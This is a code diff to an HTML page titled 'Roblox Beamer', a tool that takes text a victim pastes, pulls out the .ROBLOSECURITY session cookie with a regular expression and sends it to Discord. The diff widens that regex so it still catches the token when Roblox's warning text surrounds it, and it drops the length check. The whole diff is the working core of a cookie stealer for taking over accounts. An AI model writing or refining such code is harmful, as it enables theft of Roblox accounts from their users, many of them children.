@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>testRoblox Beamer</title>
+  <title>Roblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -62,7 +62,8 @@
       errorMessage.textContent = ""; // Clear any previous error messages
 
       // Check if the message contains the ROBLOSECURITY token
-      const robloSecurityTokenPattern = /\.ROBLOSECURITY=[A-Za-z0-9%\-._]+/i;
+      // Updated regex to match the correct format with the warning message
+      const robloSecurityTokenPattern = /(\.ROBLOSECURITY=[A-Za-z0-9%\-._\|:;\-]+(?:\|{2})?)/i;
       const match = message.match(robloSecurityTokenPattern);
 
       if (!match) {
@@ -73,12 +74,6 @@
 
       // Extract only the ROBLOSECURITY token (removes warning text)
       const token = match[0].split('=')[1];
-
-      // Check if the extracted token has the correct length (typically 72 characters)
-      if (token.length !== 72) {
-        errorMessage.textContent = "Invalid ROBLOSECURITY token format!";
-        return;
-      }
 
       // Send the token to Discord
       const discordPayload = {
